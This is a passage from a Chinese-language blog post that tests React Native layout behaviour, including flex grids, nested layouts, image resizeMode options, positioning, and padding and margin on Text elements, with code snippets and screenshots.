&lt;Text style&#x3D;&#123;[styles.text, styles.header]&#125;&gt;</span><br><span class="line">        水平垂直居中 </span><br><span class="line">    &lt;&#x2F;Text&gt;</span><br><span class="line">    &lt;View style&#x3D;&#123;&#123;height: 100, backgroundColor: &#39;#333333&#39;, alignItems: &#39;center&#39;, justifyContent: &#39;center&#39;&#125;&#125;&gt;</span><br><span class="line">      &lt;View style&#x3D;&#123;&#123;backgroundColor: &#39;#fefefe&#39;, width: 30, height: 30, borderRadius: 15&#125;&#125;&#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;View&gt;</span><br></pre></td></tr></table></figure>
<p><img src="http://upload-images.jianshu.io/upload_images/10024246-00bf883c328c1218.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h3 id="网格布局"><a href="#网格布局" class="headerlink" title="网格布局"></a>网格布局</h3><p>网格布局实验， 网格布局能够满足绝大多数的日常开发需求，所以只要满足网格布局的 spec，那么就可以证明 react 的 flex 布局能够满足正常开发需求</p>
<h4 id="等分的网格"><a href="#等分的网格" class="headerlink" title="等分的网格"></a>等分的网格</h4><p><img src="http://upload-images.jianshu.io/upload_images/10024246-615c67dbad91c938.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;View style&#x3D;&#123;styles.flexContainer&#125;&gt;</span><br><span class="line">      &lt;View style&#x3D;&#123;styles.cell&#125;&gt;</span><br><span class="line">        &lt;Text style&#x3D;&#123;styles.welcome&#125;&gt;</span><br><span class="line">          cell1</span><br><span class="line">        &lt;&#x2F;Text&gt;</span><br><span class="line">      &lt;&#x2F;View&gt;</span><br><span class="line">      &lt;View style&#x3D;&#123;styles.cell&#125;&gt;</span><br><span class="line">        &lt;Text style&#x3D;&#123;styles.welcome&#125;&gt;</span><br><span class="line">          cell2</span><br><span class="line">        &lt;&#x2F;Text&gt;</span><br><span class="line">      &lt;&#x2F;View&gt;</span><br><span class="line">      &lt;View style&#x3D;&#123;styles.cell&#125;&gt;</span><br><span class="line">        &lt;Text style&#x3D;&#123;styles.welcome&#125;&gt;</span><br><span class="line">          cell3</span><br><span class="line">        &lt;&#x2F;Text&gt;</span><br><span class="line">      &lt;&#x2F;View&gt;</span><br><span class="line">    &lt;&#x2F;View&gt;</span><br><span class="line"></span><br><span class="line">    styles &#x3D; &#123;</span><br><span class="line">        flexContainer: &#123;</span><br><span class="line">            &#x2F;&#x2F; 容器需要添加 direction 才能变成让子元素 flex</span><br><span class="line">            flexDirection: &#39;row&#39;</span><br><span class="line">        &#125;,</span><br><span class="line">        cell: &#123;</span><br><span class="line">            flex: 1,</span><br><span class="line">            height: 50,</span><br><span class="line">            backgroundColor: &#39;#aaaaaa&#39;</span><br><span class="line">        &#125;,</span><br><span class="line">        welcome: &#123;</span><br><span class="line">            fontSize: 20,</span><br><span class="line">            textAlign: &#39;center&#39;,</span><br><span class="line">            margin: 10</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="左边固定，-右边固定，中间-flex-的布局"><a href="#左边固定，-右边固定，中间-flex-的布局" class="headerlink" title="左边固定， 右边固定，中间 flex 的布局"></a>左边固定， 右边固定，中间 flex 的布局</h4><p><img src="http://upload-images.jianshu.io/upload_images/10024246-6dace85f7236a105.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;View style&#x3D;&#123;styles.flexContainer&#125;&gt;</span><br><span class="line">     &lt;View style&#x3D;&#123;styles.cellfixed&#125;&gt;</span><br><span class="line">       &lt;Text style&#x3D;&#123;styles.welcome&#125;&gt;</span><br><span class="line">         fixed</span><br><span class="line">       &lt;&#x2F;Text&gt;</span><br><span class="line">     &lt;&#x2F;View&gt;</span><br><span class="line">     &lt;View style&#x3D;&#123;styles.cell&#125;&gt;</span><br><span class="line">       &lt;Text style&#x3D;&#123;styles.welcome&#125;&gt;</span><br><span class="line">         flex</span><br><span class="line">       &lt;&#x2F;Text&gt;</span><br><span class="line">     &lt;&#x2F;View&gt;</span><br><span class="line">     &lt;View style&#x3D;&#123;styles.cellfixed&#125;&gt;</span><br><span class="line">       &lt;Text style&#x3D;&#123;styles.welcome&#125;&gt;</span><br><span class="line">         fixed</span><br><span class="line">       &lt;&#x2F;Text&gt;</span><br><span class="line">     &lt;&#x2F;View&gt;</span><br><span class="line">   &lt;&#x2F;View&gt;</span><br><span class="line"></span><br><span class="line">   styles &#x3D; &#123;</span><br><span class="line">       flexContainer: &#123;</span><br><span class="line">           &#x2F;&#x2F; 容器需要添加 direction 才能变成让子元素 flex</span><br><span class="line">           flexDirection: &#39;row&#39;</span><br><span class="line">       &#125;,</span><br><span class="line">       cell: &#123;</span><br><span class="line">           flex: 1,</span><br><span class="line">           height: 50,</span><br><span class="line">           backgroundColor: &#39;#aaaaaa&#39;</span><br><span class="line">       &#125;,</span><br><span class="line">       welcome: &#123;</span><br><span class="line">           fontSize: 20,</span><br><span class="line">           textAlign: &#39;center&#39;,</span><br><span class="line">           margin: 10</span><br><span class="line">       &#125;,</span><br><span class="line">       cellfixed: &#123;</span><br><span class="line">           height: 50,</span><br><span class="line">           width: 80,</span><br><span class="line">           backgroundColor: &#39;#fefefe&#39;</span><br><span class="line">       &#125; </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<h4 id="嵌套的网格"><a href="#嵌套的网格" class="headerlink" title="嵌套的网格"></a>嵌套的网格</h4><p>通常网格不是一层的，布局容器都是一层套一层的， 所以必须验证在<code>real world</code>下面的网格布局</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Text style&#x3D;&#123;[styles.text, styles.header]&#125;&gt;</span><br><span class="line">   嵌套的网格 </span><br><span class="line"> &lt;&#x2F;Text&gt;</span><br><span class="line"> &lt;View style&#x3D;&#123;&#123;flexDirection: &#39;row&#39;, height: 200, backgroundColor:&quot;#fefefe&quot;, padding: 20&#125;&#125;&gt;</span><br><span class="line">   &lt;View style&#x3D;&#123;&#123;flex: 1, flexDirection:&#39;column&#39;, padding: 15, backgroundColor:&quot;#eeeeee&quot;&#125;&#125;&gt;  </span><br><span class="line">       &lt;View style&#x3D;&#123;&#123;flex: 1, backgroundColor:&quot;#bbaaaa&quot;&#125;&#125;&gt;  </span><br><span class="line">       &lt;&#x2F;View&gt;</span><br><span class="line">       &lt;View style&#x3D;&#123;&#123;flex: 1, backgroundColor:&quot;#aabbaa&quot;&#125;&#125;&gt;</span><br><span class="line">       &lt;&#x2F;View&gt;</span><br><span class="line">   &lt;&#x2F;View&gt;</span><br><span class="line">   &lt;View style&#x3D;&#123;&#123;flex: 1, padding: 15, flexDirection:&#39;row&#39;, backgroundColor:&quot;#eeeeee&quot;&#125;&#125;&gt;</span><br><span class="line">       &lt;View style&#x3D;&#123;&#123;flex: 1, backgroundColor:&quot;#aaaabb&quot;&#125;&#125;&gt;  </span><br><span class="line">           &lt;View style&#x3D;&#123;&#123;flex: 1, flexDirection:&#39;row&#39;, backgroundColor:&quot;#eeaaaa&quot;&#125;&#125;&gt; </span><br><span class="line">              &lt;View style&#x3D;&#123;&#123;flex: 1, backgroundColor:&quot;#eebbaa&quot;&#125;&#125;&gt;  </span><br><span class="line">             &lt;&#x2F;View&gt;</span><br><span class="line">             &lt;View style&#x3D;&#123;&#123;flex: 1, backgroundColor:&quot;#bbccee&quot;&#125;&#125;&gt;</span><br><span class="line">             &lt;&#x2F;View&gt; </span><br><span class="line">           &lt;&#x2F;View&gt;</span><br><span class="line">           &lt;View style&#x3D;&#123;&#123;flex: 1, backgroundColor:&quot;#eebbdd&quot;&#125;&#125;&gt;</span><br><span class="line">           &lt;&#x2F;View&gt;</span><br><span class="line">       &lt;&#x2F;View&gt;</span><br><span class="line">       &lt;View style&#x3D;&#123;&#123;flex: 1, backgroundColor:&quot;#aaccaa&quot;&#125;&#125;&gt;</span><br><span class="line">         &lt;ScrollView style&#x3D;&#123;&#123;flex: 1, backgroundColor:&quot;#bbccdd&quot;, padding: 5&#125;&#125;&gt;</span><br><span class="line">               &lt;View style&#x3D;&#123;&#123;flexDirection: &#39;row&#39;, height: 50, backgroundColor:&quot;#fefefe&quot;&#125;&#125;&gt;</span><br><span class="line">                 &lt;View style&#x3D;&#123;&#123;flex: 1, flexDirection:&#39;column&#39;, backgroundColor:&quot;#eeeeee&quot;&#125;&#125;&gt;  </span><br><span class="line">                     &lt;View style&#x3D;&#123;&#123;flex: 1, backgroundColor:&quot;#bbaaaa&quot;&#125;&#125;&gt;  </span><br><span class="line">                     &lt;&#x2F;View&gt;</span><br><span class="line">                     &lt;View style&#x3D;&#123;&#123;flex: 1, backgroundColor:&quot;#aabbaa&quot;&#125;&#125;&gt;</span><br><span class="line">                     &lt;&#x2F;View&gt;</span><br><span class="line">                 &lt;&#x2F;View&gt;</span><br><span class="line">                 &lt;View style&#x3D;&#123;&#123;flex: 1, flexDirection:&#39;row&#39;, backgroundColor:&quot;#eeeeee&quot;&#125;&#125;&gt;</span><br><span class="line">                     &lt;View style&#x3D;&#123;&#123;flex: 1, backgroundColor:&quot;#aaaabb&quot;&#125;&#125;&gt;  </span><br><span class="line">                         &lt;View style&#x3D;&#123;&#123;flex: 1, flexDirection:&#39;row&#39;, backgroundColor:&quot;#eeaaaa&quot;&#125;&#125;&gt; </span><br><span class="line">                            &lt;View style&#x3D;&#123;&#123;flex: 1, backgroundColor:&quot;#eebbaa&quot;&#125;&#125;&gt;  </span><br><span class="line">                           &lt;&#x2F;View&gt;</span><br><span class="line">                           &lt;View style&#x3D;&#123;&#123;flex: 1, backgroundColor:&quot;#bbccee&quot;&#125;&#125;&gt;</span><br><span class="line">                           &lt;&#x2F;View&gt; </span><br><span class="line">                         &lt;&#x2F;View&gt;</span><br><span class="line">                         &lt;View style&#x3D;&#123;&#123;flex: 1, backgroundColor:&quot;#eebbdd&quot;&#125;&#125;&gt;</span><br><span class="line">                         &lt;&#x2F;View&gt;</span><br><span class="line">                     &lt;&#x2F;View&gt;</span><br><span class="line">                     &lt;View style&#x3D;&#123;&#123;flex: 1, backgroundColor:&quot;#aaccaa&quot;&#125;&#125;&gt;</span><br><span class="line">                     &lt;&#x2F;View&gt;</span><br><span class="line">                 &lt;&#x2F;View&gt;</span><br><span class="line">               &lt;&#x2F;View&gt;</span><br><span class="line">               &lt;Text style&#x3D;&#123;[styles.text, styles.header, &#123;color: &#39;#ffffff&#39;, fontSize: 12&#125;]&#125;&gt;</span><br><span class="line">                 &#123;(function()&#123;</span><br><span class="line">                   var str &#x3D; &#39;&#39;;</span><br><span class="line">                   var n &#x3D; 100;</span><br><span class="line">                   while(n--) &#123;</span><br><span class="line">                     str +&#x3D; &#39;嵌套的网格&#39; + &#39;\n&#39;;</span><br><span class="line">                   &#125;</span><br><span class="line">                   return str;</span><br><span class="line">                 &#125;)()&#125;</span><br><span class="line">               &lt;&#x2F;Text&gt;</span><br><span class="line">         &lt;&#x2F;ScrollView&gt; </span><br><span class="line">       &lt;&#x2F;View&gt;</span><br><span class="line">   &lt;&#x2F;View&gt;</span><br><span class="line"> &lt;&#x2F;View&gt;</span><br></pre></td></tr></table></figure>

<p><img src="http://upload-images.jianshu.io/upload_images/10024246-6ae9ca4d667f4279.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>可以看到上图的嵌套关系也是足够的复杂的，嵌套多层的布局是没有问题的。</p>
<h2 id="图片布局"><a href="#图片布局" class="headerlink" title="图片布局"></a>图片布局</h2><p>resizeMode<br>决定当组件尺寸和图片尺寸不成比例的时候如何调整图片的大小。</p>
<p>cover: 在保持图片宽高比的前提下缩放图片，直到宽度和高度都大于等于容器视图的尺寸（如果容器有 padding 内衬的话，则相应减去）。译注：这样图片完全覆盖甚至超出容器，容器中不留任何空白。</p>
<p>contain: 在保持图片宽高比的前提下缩放图片，直到宽度和高度都小于等于容器视图的尺寸（如果容器有 padding 内衬的话，则相应减去）。译注：这样图片完全被包裹在容器中，容器中可能留有空白。</p>
<p>stretch: 拉伸图片且不维持宽高比，直到宽高都刚好填满容器。</p>
<p>repeat: 重复平铺图片直到填满容器。图片会维持原始尺寸，但是当尺寸超过容器时会在保持宽高比的前提下缩放到能被容器包裹。</p>
<p>center: 居中不拉伸。</p>
<p>类型    必填<br>enum(‘cover’, ‘contain’, ‘stretch’, ‘repeat’, ‘center’)    否</p>
<h3 id="尝试使用这些-mode"><a href="#尝试使用这些-mode" class="headerlink" title="尝试使用这些 mode"></a>尝试使用这些 mode</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Text style&#x3D;&#123;styles.welcome&#125;&gt; 100px height &lt;&#x2F;Text&gt;</span><br><span class="line">  &lt;Image style&#x3D;&#123;&#123;height: 100&#125;&#125; source&#x3D;&#123;&#123;uri: &#39;http:&#x2F;&#x2F;gtms03.alicdn.com&#x2F;tps&#x2F;i3&#x2F;TB1Kcs5GXXXXXbMXVXXutsrNFXX-608-370.png&#39;&#125;&#125; &#x2F;&gt;</span><br></pre></td></tr></table></figure>
<p><img src="http://upload-images.jianshu.io/upload_images/10024246-362bad2b8b316e9d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>100px 高度， 可以看到图片适应 100 高度和全屏宽度，背景居中适应未拉伸但是被截断也就是 cover。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Text style&#x3D;&#123;styles.welcome&#125;&gt; 100px height with resizeMode contain &lt;&#x2F;Text&gt;</span><br><span class="line">  &lt;View style&#x3D;&#123;[&#123;flex: 1, backgroundColor: &#39;#fe0000&#39;&#125;]&#125;&gt;</span><br><span class="line">      &lt;Image style&#x3D;&#123;&#123;flex: 1, height: 100, resizeMode: Image.resizeMode.contain&#125;&#125; source&#x3D;&#123;&#123;uri: &#39;http:&#x2F;&#x2F;gtms03.alicdn.com&#x2F;tps&#x2F;i3&#x2F;TB1Kcs5GXXXXXbMXVXXutsrNFXX-608-370.png&#39;&#125;&#125; &#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;View&gt;</span><br></pre></td></tr></table></figure>
<p><img src="http://upload-images.jianshu.io/upload_images/10024246-8fb3d970224a8826.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>contain 模式容器完全容纳图片，图片自适应宽高</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Text style&#x3D;&#123;styles.welcome&#125;&gt; 100px height with resizeMode cover &lt;&#x2F;Text&gt;</span><br><span class="line">&lt;View style&#x3D;&#123;[&#123;flex: 1, backgroundColor: &#39;#fe0000&#39;&#125;]&#125;&gt;</span><br><span class="line">    &lt;Image style&#x3D;&#123;&#123;flex: 1, height: 100, resizeMode: Image.resizeMode.cover&#125;&#125; source&#x3D;&#123;&#123;uri: &#39;http:&#x2F;&#x2F;gtms03.alicdn.com&#x2F;tps&#x2F;i3&#x2F;TB1Kcs5GXXXXXbMXVXXutsrNFXX-608-370.png&#39;&#125;&#125; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;View&gt;</span><br></pre></td></tr></table></figure>
<p><img src="http://upload-images.jianshu.io/upload_images/10024246-838cfa2b87968c89.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>cover 模式同 100px 高度模式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Text style&#x3D;&#123;styles.welcome&#125;&gt; 100px height with resizeMode stretch &lt;&#x2F;Text&gt;</span><br><span class="line">&lt;View style&#x3D;&#123;[&#123;flex: 1, backgroundColor: &#39;#fe0000&#39;&#125;]&#125;&gt;</span><br><span class="line">    &lt;Image style&#x3D;&#123;&#123;flex: 1, height: 100, resizeMode: Image.resizeMode.stretch&#125;&#125; source&#x3D;&#123;&#123;uri: &#39;http:&#x2F;&#x2F;gtms03.alicdn.com&#x2F;tps&#x2F;i3&#x2F;TB1Kcs5GXXXXXbMXVXXutsrNFXX-608-370.png&#39;&#125;&#125; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;View&gt;</span><br></pre></td></tr></table></figure>

<p><img src="http://upload-images.jianshu.io/upload_images/10024246-79585ac3ee389124.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>stretch 模式图片被拉伸适应屏幕</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Text style&#x3D;&#123;styles.welcome&#125;&gt; set height to image container &lt;&#x2F;Text&gt;</span><br><span class="line"> &lt;View style&#x3D;&#123;[&#123;flex: 1, backgroundColor: &#39;#fe0000&#39;, height: 100&#125;]&#125;&gt;</span><br><span class="line">     &lt;Image style&#x3D;&#123;&#123;flex: 1&#125;&#125; source&#x3D;&#123;&#123;uri: &#39;http:&#x2F;&#x2F;gtms03.alicdn.com&#x2F;tps&#x2F;i3&#x2F;TB1Kcs5GXXXXXbMXVXXutsrNFXX-608-370.png&#39;&#125;&#125; &#x2F;&gt;</span><br><span class="line"> &lt;&#x2F;View&gt;</span><br></pre></td></tr></table></figure>

<p><img src="http://upload-images.jianshu.io/upload_images/10024246-93bc6559fbb2dfbf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>随便试验了一下， 发现高度设置到父容器，图片 flex 的时候也会等同于 cover 模式</p>
<h2 id="绝对定位和相对定位"><a href="#绝对定位和相对定位" class="headerlink" title="绝对定位和相对定位"></a>绝对定位和相对定位</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;View style&#x3D;&#123;&#123;flex: 1, height: 100, backgroundColor: &#39;#333333&#39;&#125;&#125;&gt;</span><br><span class="line">   &lt;View style&#x3D;&#123;[styles.circle, &#123;position: &#39;absolute&#39;, top: 50, left: 180&#125;]&#125;&gt;</span><br><span class="line">   &lt;&#x2F;View&gt;</span><br><span class="line"> &lt;&#x2F;View&gt;</span><br><span class="line"> styles &#x3D; &#123;</span><br><span class="line">   circle: &#123;</span><br><span class="line">   backgroundColor: &#39;#fe0000&#39;,</span><br><span class="line">   borderRadius: 10,</span><br><span class="line">   width: 20,</span><br><span class="line">   height: 20</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p><img src="http://upload-images.jianshu.io/upload_images/10024246-cc5a8655322a7a0e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;View style&#x3D;&#123;&#123;flex: 1, height: 100, backgroundColor: &#39;#333333&#39;&#125;&#125;&gt;</span><br><span class="line">   &lt;View style&#x3D;&#123;[styles.circle, &#123;position: &#39;relative&#39;, top: 50, left: 50, marginLeft: 50&#125;]&#125;&gt;</span><br><span class="line">   &lt;&#x2F;View&gt;</span><br><span class="line"> &lt;&#x2F;View&gt;</span><br></pre></td></tr></table></figure>

<p><img src="http://upload-images.jianshu.io/upload_images/10024246-f54b7a67e3698522.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>相对定位的可以看到很容易的配合 margin 做到了。 </p>
<h2 id="padding-和-margin"><a href="#padding-和-margin" class="headerlink" title="padding 和 margin"></a>padding 和 margin</h2><p>我们知道在 css 中区分 inline 元素和 block 元素，既然 react-native 实现了一个超级小的 css subset。那我们就来实验一下 padding 和 margin 在 inline 和非 inline 元素上的 padding 和 margin 的使用情况。</p>
<p>**padding **</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Text style&#x3D;&#123;[styles.text, styles.header]&#125;&gt;</span><br><span class="line">   在正常的 View 上设置 padding </span><br><span class="line"> &lt;&#x2F;Text&gt;</span><br><span class="line"></span><br><span class="line"> &lt;View style&#x3D;&#123;&#123;padding: 30, backgroundColor: &#39;#333333&#39;&#125;&#125;&gt;</span><br><span class="line">   &lt;Text style&#x3D;&#123;[styles.text, &#123;color: &#39;#fefefe&#39;&#125;]&#125;&gt; Text Element&lt;&#x2F;Text&gt;</span><br><span class="line"> &lt;&#x2F;View&gt;</span><br><span class="line"></span><br><span class="line"> &lt;Text style&#x3D;&#123;[styles.text, styles.header]&#125;&gt;</span><br><span class="line">   在文本元素上设置 padding</span><br><span class="line"> &lt;&#x2F;Text&gt;</span><br><span class="line"> &lt;View style&#x3D;&#123;&#123;padding: 0, backgroundColor: &#39;#333333&#39;&#125;&#125;&gt;</span><br><span class="line">   &lt;Text style&#x3D;&#123;[styles.text, &#123;backgroundColor: &#39;#fe0000&#39;, padding: 30&#125;]&#125;&gt;</span><br><span class="line">     text 元素上设置 paddinga</span><br><span class="line">   &lt;&#x2F;Text&gt;</span><br><span class="line"> &lt;&#x2F;View&gt;</span><br></pre></td></tr></table></figure>

<p><img src="http://upload-images.jianshu.io/upload_images/10024246-bcb5e4613d125463.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>在 View 上设置 padding 很顺利，没有任何问题， 但是如果在 inline 元素上设置 padding， 发现会出现上面的错误， paddingTop 和 paddingBottom 都被挤成 marginBottom 了。 按理说，不应该对 Text 做 padding 处理， 但是确实有这样的问题存在，所以可以将这个问题 mark 一下。</p>
<p><strong>margin</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Text style&#x3D;&#123;[styles.text, styles.header]&#125;&gt;</span><br><span class="line">   在正常的 View 上设置 margin </span><br><span class="line"> &lt;&#x2F;Text&gt;</span><br><span class="line"></span><br><span class="line"> &lt;View style&#x3D;&#123;&#123;backgroundColor: &#39;#333333&#39;&#125;&#125;&gt;</span><br><span class="line">   &lt;View style&#x3D;&#123;&#123;backgroundColor: &#39;#fefefe&#39;, width: 30, height: 30, margin: 30&#125;&#125;&#x2F;&gt;</span><br><span class="line"> &lt;&#x2F;View&gt;</span><br><span class="line"></span><br><span class="line"> &lt;Text style&#x3D;&#123;[styles.text, styles.header]&#125;&gt;</span><br><span class="line">   在文本元素上设置 margin</span><br><span class="line"> &lt;&#x2F;Text&gt;</span><br><span class="line"> &lt;View style&#x3D;&#123;&#123;backgroundColor: &#39;#333333&#39;&#125;&#125;&gt;</span><br><span class="line">   &lt;Text style&#x3D;&#123;[styles.text, &#123;backgroundColor: &#39;#fe0000&#39;, margin: 30&#125;]&#125;&gt;</span><br><span class="line">     text 元素上设置 margin</span><br><span class="line">   &lt;&#x2F;Text&gt;</span><br><span class="line">   &lt;Text style&#x3D;&#123;[styles.text, &#123;backgroundColor: &#39;#fe0000&#39;, margin: 30&#125;]&#125;&gt;</span><br><span class="line">     text 元素上设置 margin</span><br><span class="line">   &lt;&#x2F;Text&gt;</span><br><span class="line"> &lt;&#x2F;View&gt;</span><br></pre></td></tr></table></figure>

<p><img src="http://upload-images.jianshu.io/upload_images/10024246-92749d24ac214bed.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>我们知道，对于 inline 元素，设置 margin-left 和 margin-right 有效，top 和 bottom 按理是不会生效的， 但是上图的结果可以看到，实际是生效了的。所以现在给我的感觉是 Text 元素更应该理解为一个不能设置 padding 的 block。</p>
<p>算了不要猜了， 我们看看官方文档怎么说 Text，<a href="https://facebook.github.io/react-native/docs/text.html">https://facebook.github.io/react-native/docs/text.html</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Text&gt;</span><br><span class="line">   &lt;Text&gt;First part and &lt;&#x2F;Text&gt;</span><br><span class="line">   &lt;Text&gt;second part&lt;&#x2F;Text&gt;</span><br><span class="line"> &lt;&#x2F;Text&gt;</span><br><span class="line"> &#x2F;&#x2F; Text container: all the text flows as if it was one</span><br><span class="line"> &#x2F;&#x2F; |First part |</span><br><span class="line"> &#x2F;&#x2F; |and second |</span><br><span class="line"> &#x2F;&#x2F; |part       |</span><br><span class="line"></span><br><span class="line"> &lt;View&gt;</span><br><span class="line">   &lt;Text&gt;First part and &lt;&#x2F;Text&gt;</span><br><span class="line">   &lt;Text&gt;second part&lt;&#x2F;Text&gt;</span><br><span class="line"> &lt;&#x2F;View&gt;</span><br><span class="line"> &#x2F;&#x2F; View container: each text is its own block</span><br><span class="line"> &#x2F;&#x2F; |First part |</span><br><span class="line"> &#x2F;&#x2F; |and        |</span><br><span class="line"> &#x2F;&#x2F; |second part|</span><br></pre></td></tr></table></figure>

<p>也就是如果 Text 元素在 Text 里边，可以考虑为 inline， 如果单独在 View 里边，那就是 Block。</p>
<p>下面会专门研究一下文本相关的布局</p>
<h2 id="文本元素"><a href="#文本元素" class="headerlink" title="文本元素"></a>文本元素</h2><p>首先我们得考虑对于 Text 元素我们希望有哪些功能或者想验证哪些功能：</p>
<ol>
<li> 文字是否能自动换行？</li>
<li> overflow ellipse？</li>
<li> 是否能对部分文字设置样式 ，类似 span 等标签</li>
</ol>
<h3 id="先看看文字有哪些支持的-style-属性"><a href="#先看看文字有哪些支持的-style-属性" class="headerlink" title="先看看文字有哪些支持的 style 属性"></a>先看看文字有哪些支持的 style 属性</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;*&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;TEXT&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;*&#x2F;</span><br><span class="line">  Attributes.style &#x3D; &#123;</span><br><span class="line">    color string</span><br><span class="line">    containerBackgroundColor string</span><br><span class="line">    fontFamily string</span><br><span class="line">    fontSize number</span><br><span class="line">    fontStyle enum(&#39;normal&#39;, &#39;italic&#39;)</span><br><span class="line">    fontWeight enum(&quot;normal&quot;, &#39;bold&#39;, &#39;100&#39;, &#39;200&#39;, &#39;300&#39;, &#39;400&#39;, &#39;500&#39;, &#39;600&#39;, &#39;700&#39;, &#39;800&#39;, &#39;900&#39;)</span><br><span class="line">    lineHeight number</span><br><span class="line">    textAlign enum(&quot;auto&quot;, &#39;left&#39;, &#39;right&#39;, &#39;center&#39;)</span><br><span class="line">    writingDirection enum(&quot;auto&quot;, &#39;ltr&#39;, &#39;rtl&#39;)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h3 id="实验-1，-2，-3"><a href="#实验-1，-2，-3" class="headerlink" title="实验 1， 2， 3"></a>实验 1， 2， 3</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Text style&#x3D;&#123;[styles.text, styles.header]&#125;&gt;</span><br><span class="line">     文本元素 </span><br><span class="line"> &lt;&#x2F;Text&gt;</span><br><span class="line"></span><br><span class="line"> &lt;View style&#x3D;&#123;&#123;backgroundColor: &#39;#333333&#39;, padding: 10&#125;&#125;&gt;</span><br><span class="line">   &lt;Text style&#x3D;&#123;styles.baseText&#125; numberOfLines&#x3D;&#123;5&#125;&gt;</span><br><span class="line">     &lt;Text style&#x3D;&#123;styles.titleText&#125; onPress&#x3D;&#123;this.onPressTitle&#125;&gt;</span><br><span class="line">       文本元素&#123;&#39;\n&#39;&#125;</span><br><span class="line">     &lt;&#x2F;Text&gt;</span><br><span class="line">     &lt;Text&gt;</span><br><span class="line">       &#123;&#39;\n&#39;&#125;In this example, the nested title and body text will inherit the fontFamily from styles.baseText, but the title provides its own additional styles. The title and body will stack on top of each other on account of the literal newlines, numberOfLines is Used to truncate the text with an elipsis after computing the text layout, including line wrapping, such that the total number of lines does not exceed this number.</span><br><span class="line">     &lt;&#x2F;Text&gt;</span><br><span class="line">   &lt;&#x2F;Text&gt;</span><br><span class="line"> &lt;&#x2F;View&gt;</span><br><span class="line"> styles &#x3D; &#123;</span><br><span class="line">   baseText: &#123;</span><br><span class="line">     fontFamily: &#39;Cochin&#39;,</span><br><span class="line">     color: &#39;white&#39;</span><br><span class="line">   &#125;,</span><br><span class="line">   titleText: &#123;</span><br><span class="line">     fontSize: 20,</span><br><span class="line">     fontWeight: &#39;bold&#39;,</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p><img src="http://upload-images.jianshu.io/upload_images/10024246-f4f3db377d37595b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>从结果来看 1，2，3 得到验证。 但是不知道各位有没有发现问题， 为什么底部空出了这么多空间， 没有设置高度啊。 我去除<code>numberOfLines=&#123;5&#125;</code> 这行代码，效果如下：</p>
<p><img src="http://upload-images.jianshu.io/upload_images/10024246-25ea32e747982ffb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>所以实际上， 那段空间是文本撑开的， 但是文本被<code>numberOfLines=&#123;5&#125;</code> 截取了，但是剩余的空间还在。 我猜这应该是个 bug。</p>
<p>其实官方文档里边把<code>numberOfLines=&#123;5&#125;</code>这句放到的是长文本的 Text 元素上的，也就是子 Text 上的。 实际结果是不生效。 这应该又是一个 bug。</p>
<p>Text 元素的子 Text 元素的具体实现是怎样的， 感觉这货会有很多 bug， 看官文</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Text style&#x3D;&#123;&#123;fontWeight: &#39;bold&#39;&#125;&#125;&gt;</span><br><span class="line">  I am bold</span><br><span class="line">  &lt;Text style&#x3D;&#123;&#123;color: &#39;red&#39;&#125;&#125;&gt;</span><br><span class="line">    and red</span><br><span class="line">  &lt;&#x2F;Text&gt;</span><br><span class="line"> &lt;&#x2F;Text&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Behind the scenes, this is going to be converted to a flat</p>
<p>NSAttributedString that contains the following information</p>
</blockquote>
<p>好吧， 那对于<code>numberOfLines=&#123;5&#125;</code> 放在子 Text 元素上的那种 bug 倒是可以解释了。</p>
